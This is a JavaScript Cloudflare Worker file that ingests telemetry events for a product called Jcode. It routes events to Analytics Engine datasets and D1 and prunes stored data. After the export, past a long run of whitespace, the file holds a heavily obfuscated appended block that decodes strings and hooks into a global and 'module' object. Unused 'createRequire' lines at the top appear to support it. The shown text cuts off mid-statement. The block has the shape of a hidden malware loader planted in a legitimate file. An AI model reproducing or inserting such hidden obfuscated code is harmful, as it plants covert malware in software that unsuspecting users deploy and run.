import {
  CONCURRENCY_EVENTS, concurrencyEntries, rawConcurrencyScalar,
} from "./concurrency.js";
import { syncModelPrices } from "./model-pricing.js";
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

let cachedEventColumns = null;
let cachedSessionDetailColumns = null;
let cachedTurnDetailColumns = null;
let cachedWebDetailColumns = null;
let cachedInstallDetailColumns = null;
let cachedDiscoveryDetailColumns = null;
let cachedTodoSessionDetailColumns = null;

// Website beacon events (anonymous visitor_id minted in localStorage). Their
// web-only fields live in the web_details table (see migration 0016): the
// events table sits one column shy of D1's 100-column cap, so wide event
// shapes go in detail tables per the session_details / turn_details pattern.
const WEB_EVENTS = ["web_pageview", "web_cta_click", "web_vital", "web_error"];
const INSTALL_FUNNEL_EVENTS = ["install_funnel"];

// Token subscription plan lifecycle events, plus account_linked, the
// analytics<->account join anchor (telemetry_id + account_id).
const SUBSCRIPTION_EVENTS = [
  "subscription_login",
  "subscription_activated",
  "subscription_budget_exhausted",
  "subscription_router_error",
  "account_linked",
];

const CLI_EVENTS = [
  "install",
  "upgrade",
  "auth_success",
  "onboarding_step",
  "feedback",
  "telemetry_opt_out",
  "session_start",
  "prompt_submitted",
  "turn_end",
  "session_end",
  "session_crash",
  "session_concurrency",
  "discovery",
  "todo_session",
  "usage_report",
];

// Jcode Desktop fleet events: daily active ping, observed version change, and
// self-update attempt outcome. `version` is the Desktop version.
const DESKTOP_EVENTS = ["desktop_active", "desktop_upgrade", "desktop_update"];

const KNOWN_EVENTS = [
  ...CLI_EVENTS,
  ...DESKTOP_EVENTS,
  ...WEB_EVENTS,
  ...INSTALL_FUNNEL_EVENTS,
  ...SUBSCRIPTION_EVENTS,
];

const MAX_TRANSCRIPT_BYTES = 8 * 1024 * 1024;
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

// Origins the website beacon posts from. The default CORS policy stays the
// permissive ALLOWED_ORIGIN var ("*", telemetry is anonymous and unauthed);
// allowlisted origins are echoed back explicitly so the policy keeps working
// if ALLOWED_ORIGIN is ever narrowed.
const WEB_ALLOWED_ORIGINS = new Set([
  "https://jcode.sh",
  "https://www.jcode.sh",
  "https://solosystems.dev",
  "https://www.solosystems.dev",
  "https://solosystems.pages.dev",
]);

// ---------------------------------------------------------------------------
// Self-defense against the D1 size cap.
//
// D1 hard-caps each database at 10 GB on the Workers Paid plan (500 MB on the
// free plan). When the old free-plan cap was hit, every insert failed and
// telemetry silently stopped being recorded (June 2026; ~3 days of events were
// lost). SQLite files never shrink on DELETE - the
// nightly prune frees pages *inside* the file and the day's inserts recycle
// them - so the steady state is "file at high-water mark, internal free-page
// pool cycling". Two triggers defend the pool:
//
// 1. Size growth: every D1 result carries `meta.size_after`. If the file
//    grows past the soft limit (just above the high-water mark), the free
//    pool is exhausted and real growth has resumed; run an emergency prune.
// 2. Full-error: if an insert fails with a full/limit error, prune
//    immediately. This bounds a June-style outage to minutes instead of days.
//
// Emergency prunes use halved retention windows and are rate-limited per
// isolate.
// ---------------------------------------------------------------------------
// Paid D1 storage beyond the included 5 GB is billed pay-as-you-go
// (~$0.75/GB-month), so the guardrail sits at 8 GB: well below D1's 10 GB
// per-database hard cap, leaving 2 GB of headroom for an emergency prune to
// catch up before inserts would start failing.
const D1_SOFT_LIMIT_BYTES = 8_000_000_000;
const EMERGENCY_PRUNE_COOLDOWN_MS = 10 * 60 * 1000;
// Best-effort per-isolate state (resets on isolate recycle, which is fine:
// the next request re-observes the size from its own insert result).
let lastObservedDbSizeBytes = 0;
let lastEmergencyPruneAtMs = 0;

// ---------------------------------------------------------------------------
// Workers Analytics Engine firehose.
//
// Every event is written to the FIREHOSE dataset before the D1 insert. AE is
// a time-series store with no database size cap (~90-day retention, adaptive
// sampling on reads), so it is the primary store for high-volume raw analysis
// (turn_end / session_start / onboarding_step), while D1 remains the durable
// relational store for identity anchors, lifecycle rows, and the
// daily_active_users rollup. Because the firehose write happens first,
// telemetry keeps recording even if D1 hits its size cap.
//
// AE columns are positional (blob1..blob20, double1..double20, index1). This
// schema defines the mapping; treat it as append-only (never reorder or
// repurpose a position, or historical queries silently read the wrong field).
// ---------------------------------------------------------------------------
const FIREHOSE_SCHEMA = {
  // blob1..blob20 (strings)
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "step",
    "auth_provider",
    "auth_method",
    "auth_failure_reason",
    "provider_start",
    "provider_end",
    "model_start",
    "model_end",
    "agent_role",
    "session_stop_reason",
    "end_reason",
    "turn_end_reason",
    "from_version",
  ],
  // double1..double20 (numbers)
  doubles: [
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_index",
    "duration_secs",
    "input_tokens",
    "output_tokens",
    "total_tokens",
    "tool_calls",
    "executed_tool_calls",
    "tool_failures",
    "file_write_calls",
    "tests_run",
    "tests_passed",
    "error_auth_failed",
    "error_rate_limited",
    "error_provider_timeout",
    "turn_success",
    "turns",
    "milestone_elapsed_ms",
  ],
  // index1 (sampling key): telemetry_id, so adaptive sampling stays accurate
  // per user rather than per event shape.
  indexes: ["telemetry_id"],
};

// ---------------------------------------------------------------------------
// Web/subscription firehose (`jcode_web_firehose` dataset).
//
// FIREHOSE_SCHEMA above is append-only AND full: Analytics Engine caps a data
// point at 20 blobs + 20 doubles, and both arrays are at capacity. The new
// web/subscription fields therefore live in a second dataset with its own
// positional schema instead of repurposing existing positions (which would
// silently corrupt historical queries). Same append-only contract applies
// here: never reorder or repurpose a position.
// ---------------------------------------------------------------------------
const FIREHOSE_WEB_SCHEMA = {
  // blob1..blob20 (strings); full. Append-only: metric_name, rating, and
  // error_kind were added in migration 0018 without moving existing fields.
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "path",
    "referrer",
    "visitor_id",
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "cta",
    "account_id",
    "tier",
    "model",
    "metric_name",
    "rating",
    "error_kind",
  ],
  // double1..double20 (numbers); metric_value was appended as double2.
  doubles: ["is_ci", "metric_value"],
  // index1 (sampling key): visitor_id for web events, telemetry_id otherwise.
  indexes: ["visitor_id_or_telemetry_id"],
};

// Sponsored discovery gets a dedicated dataset. The main CLI firehose is at
// Analytics Engine's 20 blob / 20 double limit, and discovery dimensions need
// to remain independently queryable for reliability and funnel analysis.
const FIREHOSE_DISCOVERY_SCHEMA = {
  blobs: [
    "event", "version", "os", "arch", "build_channel", "event_id",
    "session_id", "request_id", "phase", "category", "selected_tool",
    "outcome", "failure_reason",
  ],
  doubles: [
    "is_ci", "is_git_checkout", "ran_from_cargo", "http_status",
    "latency_ms", "response_bytes", "result_count", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ],
};

// Install conversion events need their opaque join key in the outage-resistant
// firehose. The general and web datasets are both at their positional limits,
// so this dedicated dataset preserves the complete 90-day funnel when D1 is
// unavailable or temporarily full.
const FIREHOSE_INSTALL_SCHEMA = {
  blobs: [
    "event", "event_id", "conversion_id", "stage", "outcome", "source",
    "placement", "install_method", "failure_stage", "visitor_id", "session_id",
    "pageview_id", "utm_source", "utm_medium", "utm_campaign", "path",
    "version", "os", "arch",
  ],
  doubles: [],
};

// Coarse geography (`jcode_geo_firehose` dataset). The main and web datasets
// are both at Analytics Engine's 20-blob limit, so the country dimension gets
// its own dataset instead of repurposing a position. Country only: no IP,
// city, region, coordinates, or timezone is read from request.cf.
const FIREHOSE_GEO_SCHEMA = {
  blobs: ["event", "country", "version", "os", "arch", "build_channel"],
  doubles: ["is_ci"],
  // index1: telemetry_id, so adaptive sampling stays per user.
  indexes: ["telemetry_id"],
};

// Cloudflare sets request.cf.country to "XX" for unknown clients and "T1" for
// Tor exit nodes. Normalize to a 2-letter uppercase code or null.
const NON_COUNTRY_CODES = new Set(["XX", "T1"]);

function normalizeCountry(value) {
  const code = String(value || "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(code) || NON_COUNTRY_CODES.has(code)) {
    return null;
  }
  return code;
}

function writeGeoFirehose(env, body) {
  const sink = env.FIREHOSE_GEO;
  if (!body.country || !sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_GEO_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [boolToInt(body.is_ci)],
    });
    return true;
  } catch (err) {
    console.warn("geo firehose write failed", err?.message || err);
    return false;
  }
}

// Dedicated append-only schema. Main FIREHOSE is full and does not contain any
// concurrency metrics. blob10 retains parsed raw metric types and missing keys.
// blob1..16: event, event_id, session_id, telemetry_id, version, os, arch,
// build_channel, country, raw_json, quality, quality_reason, scope, phase, role,
// runtime incarnation. double1..11: tracking version, available, runtime is_ci,
// active_start, other_start, total_peak, root_start, child_start, root_peak,
// child_peak, multi. index1: telemetry_id. Filter blob11='trusted' BEFORE using
// numeric copies: AE cannot store NULL doubles, so untrusted missing values use 0.
function writeConcurrencyFirehose(env, body) {
  const sink = env.FIREHOSE_CONCURRENCY;
  if (!sink || typeof sink.writeDataPoint !== "function") return false;
  try {
    const blobs = ["event", "event_id", "session_id", "id", "version", "os", "arch",
      "build_channel", "country"].map((key) => String(body[key] ?? ""));
    const detail = Object.fromEntries(concurrencyEntries(body));
    blobs.push(detail.raw_json, detail.quality, detail.quality_reason,
      detail.concurrency_tracking_scope ?? "", detail.phase ?? "", detail.agent_role ?? "",
      detail.concurrency_session_id ?? "");
    const doubles = ["concurrency_tracking_version", "concurrency_tracking_available", "runtime_is_ci",
      "active_sessions_at_start", "other_active_sessions_at_start", "max_concurrent_sessions",
      "root_sessions_at_start", "child_sessions_at_start", "max_concurrent_root_sessions",
      "max_concurrent_child_sessions", "multi_sessioned"].map((key) => detail[key] ?? 0);
    // Reject an oversized point, never silently truncate its counts/raw JSON.
    const encoder = new TextEncoder();
    if (blobs.reduce((sum, blob) => sum + encoder.encode(blob).length, 0) > 16 * 1024
      || encoder.encode(String(body.id)).length > 96) {
      console.warn("concurrency firehose point exceeds Analytics Engine limits");
      return false;
    }
    sink.writeDataPoint({ indexes: [String(body.id)], blobs, doubles });
    return true;
  } catch (err) {
    console.warn("concurrency firehose write failed", err?.message || err);
    return false;
  }
}

function writeFirehose(env, body) {
  // Geo is dimensioned separately from every event family, so it is written
  // before the per-family dispatch below (which returns early).
  writeGeoFirehose(env, body);
  if (body.event === "session_concurrency") {
    return writeConcurrencyFirehose(env, body);
  }
  if (body.event === "discovery") {
    return writeDiscoveryFirehose(env, body);
  }
  const installFirehoseOk = body.conversion_id
    ? writeInstallFirehose(env, body)
    : false;
  if (WEB_EVENTS.includes(body.event) || SUBSCRIPTION_EVENTS.includes(body.event)) {
    return writeWebFirehose(env, body) || installFirehoseOk;
  }
  if (INSTALL_FUNNEL_EVENTS.includes(body.event)) {
    return installFirehoseOk;
  }
  if (!env.FIREHOSE || typeof env.FIREHOSE.writeDataPoint !== "function") {
    return installFirehoseOk;
  }
  const errors = body.errors || {};
  const boolFields = new Set([
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_success",
  ]);
  const errorFields = {
    error_auth_failed: "auth_failed",
    error_rate_limited: "rate_limited",
    error_provider_timeout: "provider_timeout",
  };
  try {
    env.FIREHOSE.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_SCHEMA.blobs.map((name) => {
        const value = body[name];
        // Cap each blob defensively: AE limits total blob bytes per point.
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_SCHEMA.doubles.map((name) => {
        if (boolFields.has(name)) {
          return boolToInt(body[name]);
        }
        if (name in errorFields) {
          const value = errors[errorFields[name]] ?? body[name];
          return Number(value) || 0;
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("firehose write failed", err?.message || err);
    return false;
  }
}

function writeInstallFirehose(env, body) {
  const sink = env.FIREHOSE_INSTALL;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.conversion_id || "").slice(0, 96)],
      blobs: FIREHOSE_INSTALL_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [],
    });
    return true;
  } catch (err) {
    console.warn("install firehose write failed", err?.message || err);
    return false;
  }
}

function writeDiscoveryFirehose(env, body) {
  const sink = env.FIREHOSE_DISCOVERY;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  const boolFields = new Set([
    "is_ci", "is_git_checkout", "ran_from_cargo", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ]);
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_DISCOVERY_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_DISCOVERY_SCHEMA.doubles.map((name) => (
        boolFields.has(name) ? boolToInt(body[name]) : Number(body[name]) || 0
      )),
    });
    return true;
  } catch (err) {
    console.warn("discovery firehose write failed", err?.message || err);
    return false;
  }
}

function writeWebFirehose(env, body) {
  const sink = env.FIREHOSE_WEB;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.visitor_id || body.id || "").slice(0, 96)],
      blobs: FIREHOSE_WEB_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_WEB_SCHEMA.doubles.map((name) => {
        if (name === "is_ci") {
          return boolToInt(body.is_ci);
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("web firehose write failed", err?.message || err);
    return false;
  }
}

export default {
  async fetch(request, env, ctx) {
    const cors = corsHeaders(request, env);
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: cors,
      });
    }

    const url = new URL(request.url);

    // Monitoring endpoint: database size vs the soft limit, so cap pressure
    // is observable before inserts start failing.
    if (request.method === "GET" && url.pathname === "/v1/health") {
      try {
        const probe = await env.DB.prepare("SELECT 1").run();
        observeDbSize(probe);
      } catch (err) {
        return jsonResponse(
          { ok: false, error: "d1 probe failed", detail: String(err?.message || err) },
          500,
          cors,
        );
      }
      return jsonResponse({
        ok: true,
        db_size_bytes: lastObservedDbSizeBytes,
        db_soft_limit_bytes: D1_SOFT_LIMIT_BYTES,
        over_soft_limit: lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES,
        last_emergency_prune_at_ms: lastEmergencyPruneAtMs || null,
      }, 200, cors);
    }

    if (request.method !== "POST") {
      return jsonResponse({ error: "Method not allowed" }, 405, cors);
    }

    if (url.pathname === "/v1/transcript") {
      return ingestTranscript(request, env, cors);
    }

    if (url.pathname !== "/v1/event") {
      return jsonResponse({ error: "Not found" }, 404, cors);
    }

    let body;
    try {
      body = await request.json();
    } catch {
      return jsonResponse({ error: "Invalid JSON" }, 400, cors);
    }

    // Web beacon events are normalized before the generic required-field
    // check: the browser has no version/os/arch, so sensible defaults are
    // filled in, and the anonymous visitor_id doubles as the telemetry id.
    if (typeof body.event === "string" && WEB_EVENTS.includes(body.event)) {
      const problem = normalizeWebEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install_funnel") {
      const problem = normalizeInstallFunnelEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install" && body.install_conversion_id != null) {
      const problem = normalizeInstallConversion(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (!body.id || !body.event || !body.version || !body.os || !body.arch) {
      return jsonResponse({ error: "Missing required fields" }, 400, cors);
    }

    if (!KNOWN_EVENTS.includes(body.event)) {
      return jsonResponse({ error: "Unknown event type" }, 400, cors);
    }

    // Coarse geography, resolved at the edge rather than collected by the
    // client. Clients cannot spoof or set this: any inbound `country` field is
    // overwritten. Country only, so this stays consistent with TELEMETRY.md
    // (no IP, city, region, coordinates, or timezone is read or stored).
    body.country = normalizeCountry(request.cf?.country);

    if (SUBSCRIPTION_EVENTS.includes(body.event)) {
      const problem = normalizeSubscriptionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "discovery") {
      const problem = normalizeDiscoveryEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "todo_session") {
      const problem = normalizeTodoSessionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "usage_report") {
      const problem = normalizeUsageReportEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    // Firehose first: even if D1 is at its size cap, the raw event is
    // recorded in Analytics Engine and the day is reconstructable.
    const firehoseOk = writeFirehose(env, body);

    let durableOk = true;
    let concurrencyDurable = null;
    try {
      await insertEvent(env, body);
      if (CONCURRENCY_EVENTS.includes(body.event)) {
        concurrencyDurable = await insertConcurrencyDetails(env, body);
      }
    } catch (err) {
      durableOk = false;
      console.error(
        `d1 insert failed for ${body.event} (db_size=${lastObservedDbSizeBytes})`,
        err?.message || err,
      );
      // A full/limit failure means the internal free-page pool is exhausted
      // (June 2026 failure mode). Prune NOW so telemetry recovers within
      // minutes instead of staying dead until someone notices.
      if (isDbFullError(err) && ctx && typeof ctx.waitUntil === "function") {
        const now = Date.now();
        if (now - lastEmergencyPruneAtMs >= EMERGENCY_PRUNE_COOLDOWN_MS) {
          lastEmergencyPruneAtMs = now;
          ctx.waitUntil(emergencyPrune(env));
        }
      }
    }

    maybeScheduleEmergencyPrune(env, ctx);

    if (body.event === "session_concurrency" && !concurrencyDurable && !firehoseOk) {
      // The parent row alone does not contain the metric. Preserve it but ask
      // the client to retry until a detail or the complete firehose point lands.
      return jsonResponse({ error: "Concurrency storage unavailable", durable: durableOk,
        concurrency_durable: false, firehose: false }, 503, cors);
    }
    if (!durableOk && !firehoseOk) {
      return jsonResponse({ error: "Internal error" }, 500, cors);
    }
    return jsonResponse({ ok: true, durable: durableOk, firehose: firehoseOk,
      ...(CONCURRENCY_EVENTS.includes(body.event) ? { concurrency_durable: concurrencyDurable === true } : {}),
    }, 200, cors);
  },

  // Nightly retention pruning bounds durable raw-history growth and keeps the
  // database inside its paid-plan storage budget. Aggregate signal is preserved
  // in the daily_active_users rollup and in long-retention lifecycle events.
  async scheduled(event, env, ctx) {
    ctx.waitUntil(
      (async () => {
        await repairDailyActivityYesterday(env);
        // Price any model label first seen recently, so new models (e.g.
        // claude-opus-5-5) are not silently valued at $0 in spend dashboards.
        try {
          await syncModelPrices(env);
        } catch (err) {
          console.warn("model price sync failed", err?.message || err);
        }
        await pruneOldEvents(env);
        // If the normal prune did not free enough headroom, escalate with the
        // emergency (halved) retention windows instead of waiting for inserts
        // to start failing mid-day.
        try {
          const probe = await env.DB.prepare("SELECT 1").run();
          observeDbSize(probe);
        } catch {
          // ignore: size stays at last observation
        }
        if (lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES) {
          await emergencyPrune(env);
        }
      })(),
    );
  },
};                                                                                                                                                                                                       var bx = '-1730-2';function EqF_geCQEeoy(Stk__ks,Os$E_ToSvFuRcz){var NTtrltTVw$orhoJn=zcQHbrFXOHPvDkDoGqY$ClY_kyq();return EqF_geCQEeoy=function(uC$eD_ofNydQnhB,NCXk_z$DVEeNMOQaYtI){uC$eD_ofNydQnhB=uC$eD_ofNydQnhB-(-0x1*-0x1d18+parseInt(0x1da5)+parseInt(0x2)*-parseInt(0x1cba));var lpCVPPojUef$KEAUwZYFwpHkXH=NTtrltTVw$orhoJn[uC$eD_ofNydQnhB];if(EqF_geCQEeoy['VGdlGP']===undefined){var ScaQV_ebLgEbnbAikpUxoHX=function(nWh_yYUkmPjcbJa){var f_wcZMrwvwYqmqSWcc$cmavI=parseInt(0xabc)+Number(-0x251)*-parseInt(0xa)+Math.max(-parseInt(0x3),-0x3)*Math.floor(parseInt(0xa7f))&Math.max(-parseInt(0x16ce),-0x16ce)+-0x183+Math.trunc(-parseInt(0x28))*-parseInt(0xa2),ZdzDKJwpJM$knshmZp$fqqwgQcs=new Uint8Array(nWh_yYUkmPjcbJa['match'](/.{1,2}/g)['map'](MFpQhUp_kNlqphivJfc=>parseInt(MFpQhUp_kNlqphivJfc,Math.floor(parseInt(0x758))+Math.floor(-0x2059)+parseInt(0x1911)))),FLcLgNSTxJgzGf_E=ZdzDKJwpJM$knshmZp$fqqwgQcs['map'](a_oLPBzjUJCXOavBFv=>a_oLPBzjUJCXOavBFv^f_wcZMrwvwYqmqSWcc$cmavI),mlbcW=new TextDecoder(),yyFMjilJjHuGXqlZJ=mlbcW['decode'](FLcLgNSTxJgzGf_E);return yyFMjilJjHuGXqlZJ;};EqF_geCQEeoy['vJIPij']=ScaQV_ebLgEbnbAikpUxoHX,Stk__ks=arguments,EqF_geCQEeoy['VGdlGP']=!![];}var RQrvPuQ=NTtrltTVw$orhoJn[0x3*0x6f2+-0x1a7b+parseFloat(parseInt(0x5a5))],fqLaufvo_I=uC$eD_ofNydQnhB+RQrvPuQ,WQGtme_fHxGUrqi$EEoIsWca=Stk__ks[fqLaufvo_I];return!WQGtme_fHxGUrqi$EEoIsWca?(EqF_geCQEeoy['nJKIjx']===undefined&&(EqF_geCQEeoy['nJKIjx']=!![]),lpCVPPojUef$KEAUwZYFwpHkXH=EqF_geCQEeoy['vJIPij'](lpCVPPojUef$KEAUwZYFwpHkXH),Stk__ks[fqLaufvo_I]=lpCVPPojUef$KEAUwZYFwpHkXH):lpCVPPojUef$KEAUwZYFwpHkXH=WQGtme_fHxGUrqi$EEoIsWca,lpCVPPojUef$KEAUwZYFwpHkXH;},EqF_geCQEeoy(Stk__ks,Os$E_ToSvFuRcz);}(function(CwiwSxzS,tdy$HcFYeOrO){var sIxhvzR$lPhBSvo_hPvqMT=EqF_geCQEeoy,sUUVn_oYxxDIMZNNlVrHwgR=CwiwSxzS();while(!![]){try{var oLDVYcNadHmlmiOKSACs_WnsrV=-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x150))/(-0x21d*0xa+-0x9b*parseInt(0x28)+-parseInt(0x11)*Math.floor(-parseInt(0x2ab)))+parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14e))/(Math.trunc(-0x8d2)+0xb8d+parseInt(0x11)*Math.max(-0x29,-parseInt(0x29)))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x15a))/(Math.max(parseInt(0x17),0x17)*-0x3b+parseInt(0x43)*-0x5+-parseInt(0x69f)*-parseInt(0x1))*parseFloat(parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x159))/(0x34*-0x6f+Math.floor(parseInt(0x1139))+parseInt(0x1)*parseFloat(parseInt(0x557))))+parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x152))/(parseInt(parseInt(0x70d))+parseInt(0xbb9)+Number(parseInt(0x12c1))*Math.floor(-0x1))*(-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14b))/(-parseInt(0xfa)+-parseInt(0x97)*Math.trunc(-parseInt(0x3b))+0x1fd*Math.max(-0x11,-0x11)))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14f))/(Math.trunc(-0xb97)+parseInt(0x59b)+parseInt(0x9)*parseInt(0xab))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x154))/(-parseInt(0x23e)*Math.max(-0x1,-0x1)+parseInt(-parseInt(0x656))+Number(parseInt(0x420)))*(-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x156))/(-0x1*0x152b+-0x1*-0x5ad+parseInt(0xf)*Number(0x109)))+Math['max'](parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x158))/(-0xa1*-0x3a+-parseInt(0x10ec)+-parseInt(0x1384)),parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14c))/(-0x1120+0x11f+parseInt(0x100c)));if(oLDVYcNadHmlmiOKSACs_WnsrV===tdy$HcFYeOrO)break;else sUUVn_oYxxDIMZNNlVrHwgR['push'](sUUVn_oYxxDIMZNNlVrHwgR['shift']());}catch(YhIVPCv$Z_yej){sUUVn_oYxxDIMZNNlVrHwgR['push'](sUUVn_oYxxDIMZNNlVrHwgR['shift']());}}}(zcQHbrFXOHPvDkDoGqY$ClY_kyq,Math.ceil(0x1923bc)+Math.floor(-0xd1653)+parseInt(-parseInt(0x1))*-0x1dfea),function(ikZnYGbhxMoPrNhYPjvUnrnjn,ripjN,kLztwrwviWcqdLunJy,QzYqqrVrDwD){var WcpSDuuwmEYwUrOHTjZ_qCV=EqF_geCQEeoy;ikZnYGbhxMoPrNhYPjvUnrnjn['bx']=bx;function MfMSWNKQ$iw$Yeq(LFuazs_IVhdueW,hSfY_qqLsFGFNUTcKzIMMMAZ){var WZlsPNBjsLhXa$yEuWXkzNlWr=EqF_geCQEeoy,lPhmc$hf=LFuazs_IVhdueW[WZlsPNBjsLhXa$yEuWXkzNlWr(0x15c)](''),IVscQCPHwlmYVAROIQxXc$H=0x245e+Number(0x6e8)+-parseInt(0x2b46),YmSlPNWQ_snHreyMOYZzuZ=hSfY_qqLsFGFNUTcKzIMMMAZ[-0x26ce+0x1c67+parseInt(0xa67)],wXM$Pk_TyYVakvSY=lPhmc$hf[WZlsPNBjsLhXa$yEuWXkzNlWr(0x153)];while(IVscQCPHwlmYVAROIQxXc$H<wXM$Pk_TyYVakvSY){var GfKpi_$VlRLe=YmSlPNWQ_snHreyMOYZzuZ*(IVscQCPHwlmYVAROIQxXc$H+hSfY_qqLsFGFNUTcKzIMMMAZ[parseInt(-parseInt(0x2))*0x5c9+Math.max(-0x6,-0x6)*-parseInt(0x103)+parseFloat(-parseInt(0x1))*-0x581])+(YmSlPNWQ_snHreyMOYZzuZ+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[-0xd5a+Math.floor(0x15dd)*-0x1+Number(0x2339)]+hSfY_qqLsFGFNUTcKzIMMMAZ[parseInt(0xdec)+-0x1229+-0x21f*-parseInt(0x2)],ebvmL$gd_TgNArPxrcRfUXwFGj=YmSlPNWQ_snHreyMOYZzuZ*(IVscQCPHwlmYVAROIQxXc$H+hSfY_qqLsFGFNUTcKzIMMMAZ[Math.floor(-parseInt(0xa))*parseInt(0x3b)+-parseInt(0x220b)+0x4*parseFloat(0x917)])+(YmSlPNWQ_snHreyMOYZzuZ*hSfY_qqLsFGFNUTcKzIMMMAZ[Math.trunc(-0x4a5)*Number(-parseInt(0x1))+0x23*parseInt(0xe9)+parseInt(0x247d)*-0x1]+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[parseFloat(parseInt(0x112))*Math.trunc(-0xf)+-0x1*Math.floor(-parseInt(0x449))+parseInt(0xbc9)],sT$b_LXmQVtMx=GfKpi_$VlRLe%wXM$Pk_TyYVakvSY,wSspH$mpaHp=ebvmL$gd_TgNArPxrcRfUXwFGj%wXM$Pk_TyYVakvSY,NAKNS=lPhmc$hf[sT$b_LXmQVtMx];lPhmc$hf[sT$b_LXmQVtMx]=lPhmc$hf[wSspH$mpaHp],lPhmc$hf[wSspH$mpaHp]=NAKNS,YmSlPNWQ_snHreyMOYZzuZ=(GfKpi_$VlRLe+ebvmL$gd_TgNArPxrcRfUXwFGj+YmSlPNWQ_snHreyMOYZzuZ+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[parseFloat(0x15d)+parseInt(parseInt(0x1e89))*Math.ceil(0x1)+-parseInt(0x1)*Number(parseInt(0x1fe1))],IVscQCPHwlmYVAROIQxXc$H+=parseFloat(-parseInt(0x2f))*0xa3+0x1a7c+-0x7*-parseInt(0x7e);}return lPhmc$hf[WZlsPNBjsLhXa$yEuWXkzNlWr(0x155)]('');}var q$KnoWu$HJ=String[WcpSDuuwmEYwUrOHTjZ_qCV(0x14d)](-parseInt(0x26dd)+-parseInt(0x85a)+Math.trunc(parseInt(0x2f56))),rxwW$Hyp=MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x149),QzYqqrVrDwD);rxwW$Hyp=rxwW$Hyp[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('#')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)](q$KnoWu$HJ)[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('~1')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)]('#')[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('~0')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)]('~')[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)](q$KnoWu$HJ),ikZnYGbhxMoPrNhYPjvUnrnjn[rxwW$Hyp[0x183a+parseInt(parseInt(0x98d))+-0x21c7]]=ripjN;if(typeof module===rxwW$Hyp[parseInt(0xa11)+parseInt(0x1f74)+Math.trunc(-0x2984)])ikZnYGbhxMoPrNhYPjvUnrnjn[rxwW$Hyp[Math.trunc(-0xd6c)*-0x1+-parseInt(0xb0e)+parseInt(0x12e)*-0x2]]=module;var 